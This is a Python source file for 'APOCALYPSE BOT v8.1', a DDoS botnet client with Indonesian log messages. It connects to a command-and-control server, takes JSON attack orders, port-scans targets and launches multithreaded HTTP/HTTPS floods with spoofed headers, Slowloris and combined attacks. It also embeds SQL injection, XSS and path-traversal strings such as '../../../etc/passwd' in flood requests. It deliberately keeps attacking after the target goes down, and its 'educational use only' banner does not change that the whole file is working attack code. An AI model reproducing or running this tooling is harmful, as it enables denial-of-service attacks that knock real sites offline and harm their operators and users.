#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# APOCALYPSE BOT v8.1 - ULTRA GANAS EDITION (NO AUTO STOP)
# BY: 𝙳𝚎𝚊𝚝Nex
# ⚠️  EDUCATIONAL USE ONLY - TEST YOUR OWN SERVERS ⚠️

import socket
import threading
import json
import time
import random
import requests
import ssl
import os
import hashlib
import sys
from datetime import datetime
from urllib.parse import urlparse

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
WHITE = '\033[97m'
BOLD = '\033[1m'
DIM = '\033[2m'
RESET = '\033[0m'

# Banner
BANNER = f"""
{RED}{BOLD}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                            💀 APOCALYPSE BOT v8.1 💀                          ║
                                                                              
                             BY:{YELLOW}𝙳𝚎𝚊𝚝Nex{RED}                              
║              ⚡ 200+ UA | 100+ REF | AUTO SCAN | AUTO ATTACK ⚡                 ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{RESET}
"""

# ========== 200+ USER AGENTS (sama seperti sebelumnya) ==========
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/16.6',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/16.5',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:119.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-A525F) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Xiaomi 13) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Oppo Find X5) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; Vivo X100) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Realme GT) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 SamsungBrowser/24.0 Chrome/121.0.0.0',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 SamsungBrowser/23.0 Chrome/120.0.0.0',
    'Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 SamsungBrowser/22.0 Chrome/119.0.0.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Twitterbot/1.0',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
    'LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta; +http://www.linkedin.com)',
    'Mozilla/5.0 (compatible; Applebot/0.3; +http://www.apple.com/go/applebot)',
    'Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)',
    'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
]

# ========== 100+ REFERERS ==========
REFERERS = [
    'https://google.com', 'https://google.co.id', 'https://google.co.uk',
    'https://google.co.jp', 'https://google.fr', 'https://google.de',
    'https://bing.com', 'https://yahoo.com', 'https://duckduckgo.com',
    'https://yandex.com', 'https://baidu.com', 'https://ecosia.org',
    'https://qwant.com', 'https://seznam.cz', 'https://naver.com',
    'https://daum.net', 'https://ask.com', 'https://aol.com',
    'https://wolframalpha.com', 'https://startpage.com',
    'https://facebook.com', 'https://m.facebook.com', 'https://instagram.com',
    'https://twitter.com', 'https://tiktok.com', 'https://linkedin.com',
    'https://pinterest.com', 'https://reddit.com', 'https://tumblr.com',
    'https://snapchat.com', 'https://whatsapp.com', 'https://telegram.org',
    'https://discord.com', 'https://twitch.tv', 'https://onlyfans.com',
    'https://patreon.com', 'https://medium.com', 'https://quora.com',
    'https://stackoverflow.com', 'https://github.com', 'https://gitlab.com',
    'https://behance.net', 'https://dribbble.com', 'https://flickr.com',
    'https://myspace.com',
    'https://youtube.com', 'https://youtu.be', 'https://vimeo.com',
    'https://dailymotion.com', 'https://spotify.com', 'https://soundcloud.com',
    'https://apple.com/music', 'https://deezer.com', 'https://tidal.com',
    'https://shazam.com', 'https://bandcamp.com', 'https://pandora.com',
    'https://iheart.com', 'https://audiomack.com', 'https://mixcloud.com',
    'https://amazon.com', 'https://ebay.com', 'https://aliexpress.com',
    'https://tokopedia.com', 'https://shopee.co.id', 'https://lazada.co.id',
    'https://blibli.com', 'https://bukalapak.com', 'https://zalora.co.id',
    'https://jd.id', 'https://olx.co.id', 'https://carousell.com',
    'https://etsy.com', 'https://wish.com', 'https://target.com',
    'https://cnn.com', 'https://bbc.com', 'https://nytimes.com',
    'https://kompas.com', 'https://detik.com', 'https://liputan6.com',
    'https://tempo.co', 'https://republika.co.id', 'https://tribunnews.com',
    'https://okezone.com', 'https://sindonews.com', 'https://merdeka.com',
    'https://foxnews.com', 'https://theguardian.com', 'https://wsj.com',
    'https://github.com', 'https://gitlab.com', 'https://bitbucket.org',
    'https://stackoverflow.com', 'https://medium.com', 'https://dev.to',
    'https://hackerrank.com', 'https://leetcode.com', 'https://w3schools.com',
    'https://codecademy.com', 'https://freecodecamp.org', 'https://codepen.io',
    'https://dzone.com', 'https://infoq.com', 'https://smashingmagazine.com',
    'https://wikipedia.org', 'https://kemdikbud.go.id', 'https://gov.id',
    'https://ui.ac.id', 'https://its.ac.id', 'https://ugm.ac.id',
    'https://unair.ac.id', 'https://telkomuniversity.ac.id',
    'https://harvard.edu', 'https://mit.edu',
]

ACCEPT_LANGUAGES = [
    'en-US,en;q=0.9', 'id-ID,id;q=0.9,en;q=0.8', 'en-GB,en;q=0.9',
    'id,en;q=0.9', 'ms-MY,ms;q=0.9,en;q=0.8', 'en-AU,en;q=0.9',
    'en-CA,en;q=0.9', 'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8', 'ko-KR,ko;q=0.9,en;q=0.8',
    'ru-RU,ru;q=0.9,en;q=0.8', 'ar-SA,ar;q=0.9,en;q=0.8', 'pt-BR,pt;q=0.9,en;q=0.8',
    'es-ES,es;q=0.9,en;q=0.8', 'it-IT,it;q=0.9,en;q=0.8', 'nl-NL,nl;q=0.9,en;q=0.8',
    'pl-PL,pl;q=0.9,en;q=0.8', 'tr-TR,tr;q=0.9,en;q=0.8', 'vi-VN,vi;q=0.9,en;q=0.8',
    'th-TH,th;q=0.9,en;q=0.8', 'hi-IN,hi;q=0.9,en;q=0.8',
]

def get_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Referer': random.choice(REFERERS),
        'Accept-Language': random.choice(ACCEPT_LANGUAGES),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
        'Connection': random.choice(['keep-alive', 'close']),
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': random.choice(['none', 'same-origin', 'cross-site']),
        'Sec-Fetch-User': '?1',
        'DNT': '1',
    }

def random_delay():
    return random.uniform(0.005, 0.05)

def random_query(url):
    param = hashlib.md5(str(random.random()).encode()).hexdigest()[:8]
    return f"{url}?_r={param}" if '?' not in url else f"{url}&_r={param}"

def random_payload():
    payloads = [
        "' OR '1'='1", "' OR 1=1--", "<script>alert(1)</script>",
        "../../../etc/passwd", "%00", "../", "?q=<script>",
        "'; DROP TABLE users--", "admin'--", "1' AND '1'='1",
        "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    ]
    return random.choice(payloads)

class PortScanner:
    COMMON_PORTS = {
        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
        80: 'HTTP', 110: 'POP3', 111: 'RPC', 135: 'RPC', 139: 'NetBIOS',
        143: 'IMAP', 443: 'HTTPS', 445: 'SMB', 993: 'IMAPS', 995: 'POP3S',
        1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
        5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt',
        8888: 'HTTP-Alt', 9000: 'PHP-FPM', 27017: 'MongoDB',
    }
    
    def __init__(self, target, timeout=1):
        self.target = target
        self.timeout = timeout
        self.open_ports = []
    
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            sock.close()
            if result == 0:
                service = self.COMMON_PORTS.get(port, 'Unknown')
                self.open_ports.append({'port': port, 'service': service})
                return True
        except:
            pass
        return False
    
    def fast_scan(self, log_callback=None):
        ports_to_scan = list(self.COMMON_PORTS.keys())
        total = len(ports_to_scan)
        
        if log_callback:
            log_callback(f"🔍 Scanning {total} popular ports on {self.target}...", 'scan')
        
        for port in ports_to_scan:
            if self.scan_port(port):
                if log_callback:
                    log_callback(f"✅ Port {port} terbuka - {self.COMMON_PORTS.get(port, 'Unknown')}", 'success')
        
        if log_callback:
            log_callback(f"📊 Scan selesai! Ditemukan {len(self.open_ports)} port terbuka", 'success')
        
        return self.open_ports

class ApocalypseBot:
    def __init__(self, server_host, server_port=4444):
        self.server = (server_host, server_port)
        self.running = True
        self.attack_running = False
        self.retry_count = 0
        self.max_retries = 3
        self.server_down = False
    
    def log(self, msg, level='info'):
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == 'success':
            print(f"{DIM}[{timestamp}]{RESET} {GREEN}✓ {msg}{RESET}")
        elif level == 'error':
            print(f"{DIM}[{timestamp}]{RESET} {RED}✗ {msg}{RESET}")
        elif level == 'warning':
            print(f"{DIM}[{timestamp}]{RESET} {YELLOW}⚠ {msg}{RESET}")
        elif level == 'attack':
            print(f"{DIM}[{timestamp}]{RESET} {RED}🔥 {msg}{RESET}")
        elif level == 'scan':
            print(f"{DIM}[{timestamp}]{RESET} {CYAN}🔍 {msg}{RESET}")
        elif level == 'down':
            print(f"{DIM}[{timestamp}]{RESET} {MAGENTA}💀 {msg}{RESET}")
        else:
            print(f"{DIM}[{timestamp}]{RESET} {CYAN}• {msg}{RESET}")
    
    def show_attack_progress(self, total, success, failed, start_time, duration, target):
        elapsed = int(time.time() - start_time)
        rate = (success / total * 100) if total > 0 else 0
        rps = int(total / elapsed) if elapsed > 0 else 0
        
        bar_width = 35
        percent = min(100, (elapsed / duration * 100) if duration > 0 else 0)
        filled = int(bar_width * percent / 100)
        bar = '█' * filled + '░' * (bar_width - filled)
        
        print(f"\r{CYAN}[{bar}]{RESET} {percent:.0f}% | {GREEN}Total: {total:>8}{RESET} | {GREEN}✓ {success:>8}{RESET} | {RED}✗ {failed:>8}{RESET} | {YELLOW}📈 Rate: {rate:>5.1f}%{RESET} | {CYAN}⚡ RPS: {rps:>5}{RESET} | ⏱️ {elapsed}s", end='')
        
        # HANYA PERINGATAN, TIDAK MATIKAN ATTACK
        if total >= 200 and failed >= 100 and (success / total) < 0.3 and not self.server_down:
            self.server_down = True
            print(f"\n{YELLOW}{'═'*70}{RESET}")
            print(f"{RED}{BOLD}⚠️  PERINGATAN! Server mungkin DOWN! ⚠️{RESET}")
            print(f"{RED}⚠️  {failed:,} dari {total:,} request gagal ({rate:.1f}% success rate){RESET}")
            print(f"{YELLOW}⚠️  Server target kemungkinan sudah tidak merespon!{RESET}")
            print(f"{YELLOW}⚠️  ATTACK TETAP BERJALAN! (No auto stop){RESET}")
            print(f"{YELLOW}{'═'*70}{RESET}")
    
    def auto_scan_and_attack(self, target, duration, threads=500):
        parsed = urlparse(target)
        host = parsed.netloc or target
        target_ip = host.split(':')[0]
        
        self.log(f"🎯 Target IP: {target_ip}", 'scan')
        
        scanner = PortScanner(target_ip)
        open_ports = scanner.fast_scan(log_callback=self.log)
        
        if not open_ports:
            self.log(f"⚠️ Tidak ada port terbuka di {target_ip}, menggunakan default port 80", 'warning')
            self.start_attack_with_retry('http_l7', target, duration, threads)
            return True
        
        http_ports = [p for p in open_ports if p['port'] in [80, 8080, 8000, 8888]]
        https_ports = [p for p in open_ports if p['port'] in [443, 8443]]
        
        self.log(f"📊 Hasil scan: HTTP ports: {http_ports}, HTTPS ports: {https_ports}", 'info')
        
        if https_ports:
            self.log(f"✅ HTTPS port ditemukan ({https_ports[0]['port']}) - menggunakan HTTPS Flood", 'success')
            self.start_attack_with_retry('https_l7', target, duration, threads)
        elif http_ports:
            self.log(f"✅ HTTP port ditemukan ({http_ports[0]['port']}) - menggunakan HTTP Flood", 'success')
            self.start_attack_with_retry('http_l7', target, duration, threads)
        else:
            self.log(f"Port lain ditemukan: {open_ports} - menggunakan HTTP default", 'info')
            self.start_attack_with_retry('http_l7', target, duration, threads)
        
        return True
    
    def start_attack_with_retry(self, mode, target, duration, threads=500):
        self.attack_running = True
        self.retry_count = 0
        self.server_down = False
        
        while self.attack_running and self.retry_count < self.max_retries:
            self.log(f"🚀 Memulai {mode.upper()} ke {target} (Attempt {self.retry_count + 1}/{self.max_retries})", 'attack')
            
            if mode == 'http_l7':
                success = self.http_flood_ganas(target, duration, threads)
            elif mode == 'https_l7':
                success = self.https_flood_ganas(target, duration, threads)
            elif mode == 'slowloris_l7':
                success = self.slowloris_ganas(target, duration)
            elif mode == 'all_l7':
                success = self.all_modes_ganas(target, duration)
            else:
                success = self.http_flood_ganas(target, duration, threads)
            
            if not self.attack_running:
                break
            
            if success:
                self.log(f"✅ {mode.upper()} selesai dengan SUKSES!", 'success')
                break
            else:
                self.retry_count += 1
                if self.retry_count < self.max_retries:
                    wait = 5 * self.retry_count
                    self.log(f"⚠️ Attack gagal, mencoba ulang dalam {wait} detik... ({self.retry_count}/{self.max_retries})", 'warning')
                    time.sleep(wait)
                else:
                    self.log(f"❌ Attack gagal setelah {self.max_retries} kali percobaan", 'error')
        
        self.attack_running = False
    
    def http_flood_ganas(self, target, duration, threads=500):
        if not target.startswith(('http://', 'https://')):
            target = 'http://' + target
        
        session = requests.Session()
        session.verify = False
        
        total, success, failed = 0, 0, 0
        start = time.time()
        
        self.log(f"🔥 HTTP FLOOD dimulai ke {target} dengan {threads} thread", 'attack')
        
        def worker():
            nonlocal total, success, failed
            retry = 0
            while self.attack_running and (time.time() - start) < duration:
                try:
                    url = random_query(target)
                    headers = get_headers()
                    
                    if random.random() < 0.15:
                        payload = random_payload()
                        url = f"{url}&test={payload}"
                        r = session.get(url, headers=headers, timeout=3)
                    elif random.random() < 0.3:
                        r = session.post(url, headers=headers, data={'x': 'x'*random.randint(100,1000)}, timeout=3)
                    else:
                        r = session.get(url, headers=headers, timeout=3)
                    
                    success += 1
                    retry = 0
                    time.sleep(random_delay())
                except:
                    failed += 1
                    retry += 1
                    if retry <= 3:
                        time.sleep(0.1 * retry)
                total += 1
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        while self.attack_running and (time.time() - start) < duration:
            time.sleep(1)
            self.show_attack_progress(total, success, failed, start, duration, target)
            # TIDAK ADA AUTO STOP! Attack tetap berjalan meskipun server down
        
        for t in thread_list:
            t.join(timeout=1)
        
        return success > 0
    
    def https_flood_ganas(self, target, duration, threads=500):
        if not target.startswith('https://'):
            target = 'https://' + target.replace('http://', '')
        return self.http_flood_ganas(target, duration, threads)
    
    def slowloris_ganas(self, target, duration):
        parsed = urlparse(target)
        host = parsed.netloc or target
        port = 443 if 'https' in target else 80
        
        sockets = []
        start = time.time()
        self.log(f"🐌 SLOWLORIS dimulai ke {host}:{port}", 'attack')
        
        for i in range(300):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                if port == 443:
                    ctx = ssl.create_default_context()
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.send(f"GET /?{i} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {host}\r\n".encode())
                sock.send(f"User-Agent: {random.choice(USER_AGENTS)}\r\n".encode())
                sock.send("Accept: text/html\r\n\r\n".encode())
                sockets.append(sock)
            except:
                pass
        
        self.log(f"✅ {len(sockets)} sockets opened", 'success')
        
        while self.attack_running and (time.time() - start) < duration:
            active = 0
            for sock in sockets[:]:
                try:
                    sock.send(f"X-Rnd: {random.randint(1,9999)}\r\n".encode())
                    active += 1
                except:
                    sockets.remove(sock)
            elapsed = int(time.time() - start)
            print(f"\r{CYAN}🐌 Slowloris | Active: {len(sockets)} | Sockets: {active} | ⏱️ {elapsed}s{RESET}", end='')
            time.sleep(10)
        
        for sock in sockets:
            sock.close()
        
        return len(sockets) > 0
    
    def all_modes_ganas(self, target, duration):
        self.log("💀 ALL MODES ACTIVE - FULL POWER ATTACK! 💀", 'attack')
        
        threads = [
            threading.Thread(target=self.http_flood_ganas, args=(target, duration, 300)),
            threading.Thread(target=self.https_flood_ganas, args=(target, duration, 200)),
            threading.Thread(target=self.slowloris_ganas, args=(target, duration)),
        ]
        
        for t in threads:
            t.daemon = True
            t.start()
        
        for t in threads:
            t.join()
        
        return True
    
    def connect(self):
        print(BANNER)
        print()
        self.log(f"Connecting to C2: {self.server[0]}:{self.server[1]}")
        
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect(self.server)
                self.log("Connected to C2 Server", 'success')
                self.send_heartbeat()
                self.listen()
            except Exception as e:
                self.log(f"Connection failed: {e}, retrying...", 'error')
                time.sleep(10)
    
    def send_heartbeat(self):
        try:
            heartbeat = json.dumps({'type': 'heartbeat', 'timestamp': time.time()})
            self.sock.send(heartbeat.encode())
        except:
            pass
        threading.Timer(30, self.send_heartbeat).start()
    
    def listen(self):
        while self.running:
            try:
                data = self.sock.recv(4096).decode()
                if not data:
                    break
                cmd = json.loads(data)
                self.process_command(cmd)
            except:
                break
    
    def process_command(self, cmd):
        if cmd.get('type') == 'auto_attack':
            target = cmd.get('target')
            duration = cmd.get('duration', 60)
            threads = cmd.get('threads', 500)
            self.log(f"AUTO ATTACK: Scanning & attacking {target} ({duration}s)", 'warning')
            threading.Thread(target=self.auto_scan_and_attack, args=(target, duration, threads)).start()
        
        elif cmd.get('type') == 'attack':
            mode = cmd.get('mode')
            target = cmd.get('target')
            duration = cmd.get('duration', 60)
            threads = cmd.get('threads', 500)
            self.log(f"ATTACK: {mode} -> {target} ({duration}s)", 'warning')
            self.start_attack_with_retry(mode, target, duration, threads)
    
    def run(self):
        self.connect()

if __name__ == "__main__":
    print(f"{CYAN}[?] C2 Server IP (default: 127.0.0.1): {RESET}", end='')
    c2_ip = input().strip() or "127.0.0.1"
    
    bot = ApocalypseBot(c2_ip, 4444)
    bot.run()
